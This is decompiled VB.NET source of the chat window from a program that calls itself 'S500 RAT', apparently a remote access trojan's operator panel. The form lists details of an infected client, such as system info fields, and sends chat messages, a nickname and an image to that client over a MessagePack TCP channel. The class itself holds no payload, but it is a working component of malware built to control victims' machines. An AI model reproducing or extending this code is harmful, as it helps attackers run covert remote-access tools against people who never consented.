Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000012 RID: 18
	<DesignerGenerated()>
	Public Partial Class FormChat
		Inherits Form

		' Token: 0x06000121 RID: 289 RVA: 0x00009A0C File Offset: 0x00007C0C
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormChat_Load
			AddHandler MyBase.Resize, AddressOf Me.FormChat_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700008C RID: 140
		' (get) Token: 0x06000124 RID: 292 RVA: 0x0000AA05 File Offset: 0x00008C05
		' (set) Token: 0x06000125 RID: 293 RVA: 0x0000AA10 File Offset: 0x00008C10
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700008D RID: 141
		' (get) Token: 0x06000126 RID: 294 RVA: 0x0000AA53 File Offset: 0x00008C53
		' (set) Token: 0x06000127 RID: 295 RVA: 0x0000AA5D File Offset: 0x00008C5D
		Public Overridable Property richTextBox1 As UIRichTextBox

		' Token: 0x1700008E RID: 142
		' (get) Token: 0x06000128 RID: 296 RVA: 0x0000AA66 File Offset: 0x00008C66
		' (set) Token: 0x06000129 RID: 297 RVA: 0x0000AA70 File Offset: 0x00008C70
		Public Overridable Property TextBox1 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.TextBox1_KeyDown
				Dim textBox As Guna2TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.KeyDown, value2
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x1700008F RID: 143
		' (get) Token: 0x0600012A RID: 298 RVA: 0x0000AAB3 File Offset: 0x00008CB3
		' (set) Token: 0x0600012B RID: 299 RVA: 0x0000AABD File Offset: 0x00008CBD
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000090 RID: 144
		' (get) Token: 0x0600012C RID: 300 RVA: 0x0000AAC6 File Offset: 0x00008CC6
		' (set) Token: 0x0600012D RID: 301 RVA: 0x0000AAD0 File Offset: 0x00008CD0
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000091 RID: 145
		' (get) Token: 0x0600012E RID: 302 RVA: 0x0000AAD9 File Offset: 0x00008CD9
		' (set) Token: 0x0600012F RID: 303 RVA: 0x0000AAE3 File Offset: 0x00008CE3
		Friend Overridable Property Guna2ResizeBox2 As Guna2ResizeBox

		' Token: 0x17000092 RID: 146
		' (get) Token: 0x06000130 RID: 304 RVA: 0x0000AAEC File Offset: 0x00008CEC
		' (set) Token: 0x06000131 RID: 305 RVA: 0x0000AAF6 File Offset: 0x00008CF6
		Friend Overridable Property PanelStart As Panel

		' Token: 0x17000093 RID: 147
		' (get) Token: 0x06000132 RID: 306 RVA: 0x0000AAFF File Offset: 0x00008CFF
		' (set) Token: 0x06000133 RID: 307 RVA: 0x0000AB0C File Offset: 0x00008D0C
		Public Overridable Property NicnameText As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._NicnameText
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.NicnameText_KeyDown
				Dim nicnameText As Guna2TextBox = Me._NicnameText
				If nicnameText IsNot Nothing Then
					RemoveHandler nicnameText.KeyDown, value2
				End If
				Me._NicnameText = value
				nicnameText = Me._NicnameText
				If nicnameText IsNot Nothing Then
					AddHandler nicnameText.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000094 RID: 148
		' (get) Token: 0x06000134 RID: 308 RVA: 0x0000AB4F File Offset: 0x00008D4F
		' (set) Token: 0x06000135 RID: 309 RVA: 0x0000AB5C File Offset: 0x00008D5C
		Friend Overridable Property PictureBox1 As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._PictureBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As EventHandler = AddressOf Me.PictureBox1_Click
				Dim pictureBox As PictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					RemoveHandler pictureBox.Click, value2
				End If
				Me._PictureBox1 = value
				pictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					AddHandler pictureBox.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000095 RID: 149
		' (get) Token: 0x06000136 RID: 310 RVA: 0x0000AB9F File Offset: 0x00008D9F
		' (set) Token: 0x06000137 RID: 311 RVA: 0x0000ABA9 File Offset: 0x00008DA9
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000096 RID: 150
		' (get) Token: 0x06000138 RID: 312 RVA: 0x0000ABB2 File Offset: 0x00008DB2
		' (set) Token: 0x06000139 RID: 313 RVA: 0x0000ABBC File Offset: 0x00008DBC
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000097 RID: 151
		' (get) Token: 0x0600013A RID: 314 RVA: 0x0000ABC5 File Offset: 0x00008DC5
		' (set) Token: 0x0600013B RID: 315 RVA: 0x0000ABCF File Offset: 0x00008DCF
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000098 RID: 152
		' (get) Token: 0x0600013C RID: 316 RVA: 0x0000ABD8 File Offset: 0x00008DD8
		' (set) Token: 0x0600013D RID: 317 RVA: 0x0000ABE2 File Offset: 0x00008DE2
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000099 RID: 153
		' (get) Token: 0x0600013E RID: 318 RVA: 0x0000ABEB File Offset: 0x00008DEB
		' (set) Token: 0x0600013F RID: 319 RVA: 0x0000ABF8 File Offset: 0x00008DF8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009A RID: 154
		' (get) Token: 0x06000140 RID: 320 RVA: 0x0000AC3B File Offset: 0x00008E3B
		' (set) Token: 0x06000141 RID: 321 RVA: 0x0000AC45 File Offset: 0x00008E45
		Public Property Client As Clients

		' Token: 0x1700009B RID: 155
		' (get) Token: 0x06000142 RID: 322 RVA: 0x0000AC4E File Offset: 0x00008E4E
		' (set) Token: 0x06000143 RID: 323 RVA: 0x0000AC58 File Offset: 0x00008E58
		Public Property F As FormS500

		' Token: 0x1700009C RID: 156
		' (get) Token: 0x06000144 RID: 324 RVA: 0x0000AC61 File Offset: 0x00008E61
		' (set) Token: 0x06000145 RID: 325 RVA: 0x0000AC6B File Offset: 0x00008E6B
		Public Property FullPath As String

		' Token: 0x1700009D RID: 157
		' (get) Token: 0x06000146 RID: 326 RVA: 0x0000AC74 File Offset: 0x00008E74
		' (set) Token: 0x06000147 RID: 327 RVA: 0x0000AC7E File Offset: 0x00008E7E
		Friend Property ParentClient As Clients

		' Token: 0x06000148 RID: 328 RVA: 0x0000AC88 File Offset: 0x00008E88
		Private Sub FormChat_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Try
				Me.EncodingImage = Me.SetImage(Resources.Chatt)
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000149 RID: 329 RVA: 0x0000ADA0 File Offset: 0x00008FA0
		Public Function SetImage(Img As Image) As Byte()
			Dim result As Byte()
			Try
				Dim memoryStream As MemoryStream = New MemoryStream()
				Dim bitmap As Bitmap = CType(Img, Bitmap)
				Using New MemoryStream()
					bitmap.Save(memoryStream, ImageFormat.Jpeg)
					result = memoryStream.ToArray()
				End Using
			Catch ex As Exception
				result = New Byte(-1) {}
			End Try
			Return result
		End Function

		' Token: 0x0600014A RID: 330 RVA: 0x0000AE18 File Offset: 0x00009018
		Private Sub FormChat_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600014B RID: 331 RVA: 0x0000AEAC File Offset: 0x000090AC
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600014C RID: 332 RVA: 0x0000AF18 File Offset: 0x00009118
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.Client IsNot Nothing
			If flag Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "chatExit"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
			End Sub)
			MyBase.Close()
		End Sub

		' Token: 0x0600014D RID: 333 RVA: 0x0000AFA8 File Offset: 0x000091A8
		Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Me.TextBox1.Enabled AndAlso Not String.IsNullOrWhiteSpace(Me.TextBox1.Text)
			If flag Then
				Dim flag2 As Boolean = e.KeyCode = Keys.[Return]
				If flag2 Then
					e.SuppressKeyPress = True
					Dim flag3 As Boolean = Operators.CompareString(Me.TextBox1.Text, String.Empty, False) <> 0
					If flag3 Then
						SyncLock Me
							Me.richTextBox1.SelectionColor = Color.LimeGreen
							Me.richTextBox1.AppendText("ME: " & vbLf)
							Me.richTextBox1.SelectionColor = Color.White
							Me.richTextBox1.AppendText(Me.TextBox1.Text + Environment.NewLine)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "chatWriteInput"
							msgPack.ForcePathObject("Input").AsString = Me.NicnameText.Text + ": " & vbLf
							msgPack.ForcePathObject("Input2").AsString = Me.TextBox1.Text
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							Me.TextBox1.Clear()
						End SyncLock
					End If
				Else
					Me.TextBox1.[Select]()
				End If
			End If
		End Sub

		' Token: 0x0600014E RID: 334 RVA: 0x0000B144 File Offset: 0x00009344
		Private Sub NicnameText_KeyDown(sender As Object, e As KeyEventArgs)
			Try
				Dim flag As Boolean = e.KeyCode = Keys.[Return]
				If flag Then
					e.SuppressKeyPress = True
					Dim flag2 As Boolean = Operators.CompareString(Me.NicnameText.Text, Nothing, False) = 0
					If flag2 Then
						MessageBox.Show("Please enter the nickname", "S500 RAT | Chat !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Dim flag3 As Boolean = Me.EncodingImage.Length <= 0
						If flag3 Then
							Me.EncodingImage = Me.SetImage(Resources.S42)
						End If
						Me.NicnameText.Enabled = False
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "Start"
						msgPack.ForcePathObject("Nicname").AsString = Me.NicnameText.Text
						msgPack.ForcePathObject("img").SetAsBytes(Me.EncodingImage)
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.PanelStart.Visible = False
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600014F RID: 335 RVA: 0x0000B26C File Offset: 0x0000946C
		Private Sub PictureBox1_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "Choose jpg"
					openFileDialog.Filter = "Jpg |*.jpg"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Me.EncodingImage = File.ReadAllBytes(openFileDialog.FileName)
						Me.PictureBox1.Image = Image.FromFile(openFileDialog.FileName)
					Else
						Me.PictureBox1.Image = Resources.S42
						Me.EncodingImage = Me.SetImage(Resources.S42)
					End If
				End Using
			Catch ex As Exception
				MessageBox.Show(ex.Message, "S500 RAT | Chat !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x04000098 RID: 152
		Private FormSize As Boolean

		' Token: 0x04000099 RID: 153
		Public EncodingImage As Byte()
	End Class
End Namespace
